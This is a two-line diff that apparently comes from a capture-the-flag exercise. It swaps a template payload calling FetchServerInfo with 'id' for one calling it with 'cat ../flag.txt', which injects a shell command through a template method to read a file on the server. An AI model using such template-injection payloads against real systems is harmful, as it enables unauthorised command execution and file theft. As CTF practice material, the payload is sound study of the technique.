@@ -1,2 +1,2 @@
 TEST213
-{{.FetchServerInfo "id"}}
+{{.FetchServerInfo "cat ../flag.txt"}}
